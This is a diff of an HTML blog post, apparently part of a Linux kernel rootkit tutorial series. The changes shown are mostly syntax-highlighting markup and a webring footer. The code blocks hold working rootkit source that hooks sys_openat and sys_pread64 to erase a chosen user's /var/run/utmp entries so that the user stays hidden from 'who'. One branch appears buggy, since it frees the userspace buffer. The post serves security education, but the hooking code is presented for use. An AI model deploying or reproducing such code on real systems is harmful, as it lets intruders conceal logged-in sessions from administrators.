@@ -260,17 +260,17 @@ Looking at the output of who, we see a list of all the active terminal devices a
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * Allocate a kernel buffer to copy the filename into
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * If it fails, just return the real sys_openat() without delay
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
-</span></span><span style="display:flex;"><span>    kbuf <span style="color:#f92672">=</span> kzalloc(NAME_MAX, GFP_KERNEL);
+</span></span><span style="display:flex;"><span>    kbuf <span style="color:#f92672">=</span> <span style="color:#a6e22e">kzalloc</span>(NAME_MAX, GFP_KERNEL);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(kbuf <span style="color:#f92672">==</span> NULL)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> orig_openat(regs);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">orig_openat</span>(regs);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/*
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * Copy the filename from userspace into the kernel buffer
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * If it fails, just return the real sys_openat() without delay
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
-</span></span><span style="display:flex;"><span>    error <span style="color:#f92672">=</span> copy_from_user(kbuf, filename, NAME_MAX);
+</span></span><span style="display:flex;"><span>    error <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_from_user</span>(kbuf, filename, NAME_MAX);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(error)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> orig_openat(regs);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">orig_openat</span>(regs);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/*
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * Compare the filename to &#34;/var/run/utmp&#34;
@@ -278,18 +278,18 @@ Looking at the output of who, we see a list of all the active terminal devices a
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * and return after freeing the kernel buffer. We just about get away with
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * this delay between calling and returning
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( memcmp(kbuf, target, target_len) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">memcmp</span>(kbuf, target, target_len) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> )
 </span></span><span style="display:flex;"><span>    {
-</span></span><span style="display:flex;"><span>        tamper_fd <span style="color:#f92672">=</span> orig_openat(regs);
-</span></span><span style="display:flex;"><span>        kfree(kbuf);
+</span></span><span style="display:flex;"><span>        tamper_fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">orig_openat</span>(regs);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">kfree</span>(kbuf);
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> tamper_fd;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/*
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * If we didn&#39;t get a match, then just need to free the buffer and return
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
-</span></span><span style="display:flex;"><span>    kfree(kbuf);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> orig_openat(regs);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">kfree</span>(kbuf);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">orig_openat</span>(regs);
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>Okay, that&rsquo;s fairly straightforward. Luckily, there seems to be just enough tolerance to let us free the kernel buffer in-between saving the file descriptor to <code>tamper_fd</code> and returning it to userspace (<code>hook_openat()</code> is going to get called <em>a lot</em>, so we definitely don&rsquo;t want to leave un-free&rsquo;d kernel buffers lying around!).</p>
 <p>Next up, we need to write the <code>hook_pread64()</code> function. The arguments for <code>sys_pread64()</code> are the same as <code>sys_read()</code> except we have an extra <code>loff_t</code> offset which indicates how far into the file we&rsquo;re reading (this is incremented by <code>384</code> each time <code>sys_pread64()</code> is called by <code>who</code>). This means that our hook will take a very similar form to previous hooks of syscalls that fill buffers.</p>
@@ -313,7 +313,7 @@ Looking at the output of who, we see a list of all the active terminal devices a
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> regs<span style="color:#f92672">-&gt;</span>di;
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)regs<span style="color:#f92672">-&gt;</span>si;
-</span></span><span style="display:flex;"><span>    size_t count <span style="color:#f92672">=</span> regs<span style="color:#f92672">-&gt;</span>dx;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">size_t</span> count <span style="color:#f92672">=</span> regs<span style="color:#f92672">-&gt;</span>dx;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>kbuf;
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> utmp <span style="color:#f92672">*</span>utmp_buf;
@@ -333,17 +333,17 @@ Looking at the output of who, we see a list of all the active terminal devices a
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">         * Allocate the usual kernel buffer
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">         * The count argument from rdx is the size of the buffer (should be 384)
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">         */</span>
-</span></span><span style="display:flex;"><span>        kbuf <span style="color:#f92672">=</span> kzalloc(count, GFP_KERNEL);
+</span></span><span style="display:flex;"><span>        kbuf <span style="color:#f92672">=</span> <span style="color:#a6e22e">kzalloc</span>(count, GFP_KERNEL);
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>( kbuf <span style="color:#f92672">==</span> NULL)
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> orig_pread64(regs);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">orig_pread64</span>(regs);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>        <span style="color:#75715e">/*
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">         * Do the real syscall, save the return value in ret
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">         * buf will then hold a utmp struct, but we need to copy it into kbuf first
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">         */</span>
-</span></span><span style="display:flex;"><span>        ret <span style="color:#f92672">=</span> orig_pread64(regs);
+</span></span><span style="display:flex;"><span>        ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">orig_pread64</span>(regs);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        error <span style="color:#f92672">=</span> copy_from_user(kbuf, buf, count);
+</span></span><span style="display:flex;"><span>        error <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_from_user</span>(kbuf, buf, count);
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (error <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> ret;
 </span></span><span style="display:flex;"><span>
@@ -351,7 +351,7 @@ Looking at the output of who, we see a list of all the active terminal devices a
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">         * Cast kbuf to a utmp struct and compare .ut_user to HIDDEN_USER
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">         */</span>
 </span></span><span style="display:flex;"><span>        utmp_buf <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> utmp <span style="color:#f92672">*</span>)kbuf;
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( memcmp(utmp_buf<span style="color:#f92672">-&gt;</span>ut_user, HIDDEN_USER, strlen(HIDDEN_USER)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">memcmp</span>(utmp_buf<span style="color:#f92672">-&gt;</span>ut_user, HIDDEN_USER, <span style="color:#a6e22e">strlen</span>(HIDDEN_USER)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> )
 </span></span><span style="display:flex;"><span>        {
 </span></span><span style="display:flex;"><span>            <span style="color:#75715e">/*
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">             * If we get a match, then we can just overwrite kbuf with 0x0
@@ -362,9 +362,9 @@ Looking at the output of who, we see a list of all the active terminal devices a
 </span></span><span style="display:flex;"><span>            <span style="color:#75715e">/*
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">             * Copy kbuf back to the userspace buf
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">             */</span>
-</span></span><span style="display:flex;"><span>            error <span style="color:#f92672">=</span> copy_to_user(buf, kbuf, count);
+</span></span><span style="display:flex;"><span>            error <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_to_user</span>(buf, kbuf, count);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            kfree(kbuf);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">kfree</span>(kbuf);
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> ret;
 </span></span><span style="display:flex;"><span>        }
 </span></span><span style="display:flex;"><span>
@@ -372,14 +372,14 @@ Looking at the output of who, we see a list of all the active terminal devices a
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">         * We intercepted a sys_pread64() to /var/run/utmp, but this entry
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">         * isn&#39;t about HIDDEN_USER, so just free the kernel buffer and return
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">         */</span>
-</span></span><span style="display:flex;"><span>        kfree(buf);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">kfree</span>(buf);
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> ret;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/*
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * This isn&#39;t a sys_pread64() to /var/run/utmp, do nothing
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> orig_pread64(regs);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">orig_pread64</span>(regs);
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>And that&rsquo;s pretty much all there is to it! Filling out the rest (<a href="../linux_rootkits_02/">Ftrace, pre-4.17 calling convention version, etc)</a>), or grabbing the source from <a href="https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.9_hiding_logged_in_users">the repo</a>, and we can get testing!</p>
 <p>If we want to create a new <code>pts</code> assigned to root, we need to use a terminal multiplexer. The easiest for this is probably screen (a simple <code>sudo bash</code> isn&rsquo;t enough).</p>
@@ -401,7 +401,7 @@ Looking at the output of who, we see a list of all the active terminal devices a
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/*
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * Copy the contents of /var/run/utmp into our buffer
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
-</span></span><span style="display:flex;"><span>fread((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)buf, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> utmp), BUFSIZE <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> utmp), fp);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fread</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)buf, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> utmp), BUFSIZE <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> utmp), fp);
 </span></span></code></pre></div><p>Here, I used <code>fread()</code> which, according the <a href="https://man7.org/linux/man-pages/man3/fread.3.html">man page</a>, reads binary input from a file descriptor. All it does is copy <code>BUFSIZE / sizeof(struct utmp)</code> chunks of size <code>sizeof(struct utmp)</code> bytes from the file descriptor <code>fp</code> into the buffer <code>buf</code>. In other words, <code>BUFSIZE</code> bytes of data get read from <code>fp</code> into <code>buf</code>.</p>
 <p>That&rsquo;s all good for source code, but let&rsquo;s see what happens after it&rsquo;s compiled. Here&rsquo;s the (heavily truncated) output of <code>strace ./enum_utmp</code>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openat<span style="color:#f92672">(</span>AT_FDCWD, <span style="color:#e6db74">&#34;/var/run/utmp&#34;</span>, O_RDONLY<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
@@ -466,6 +466,21 @@ Looking at the output of who, we see a list of all the active terminal devices a
 
 <script src="/assets/main.js"></script>
 <script src="/assets/prism.js"></script>
+
+<div class="footer__webring">
+    <span>
+        <div>
+            this site is part of the <a href='https://pixeldreams.tokyo/cgi-bin/webring.cgi'>HauNTed wEbriNg</a>
+        </div>
+        <div>
+            <p>
+                <a href='https://pixeldreams.tokyo/cgi-bin/webring.cgi?before=https://xcellerator.github.io/'>&lt;&lt;&lt;</a>
+                <a href='https://pixeldreams.tokyo/cgi-bin/webring.cgi?random=https://xcellerator.github.io/'>RaNDom</a>
+                <a href='https://pixeldreams.tokyo/cgi-bin/webring.cgi?after=https://xcellerator.github.io/'>&gt;&gt;&gt;</a>
+            </p>
+        </div>
+    </span>
+</div>
 
 
 
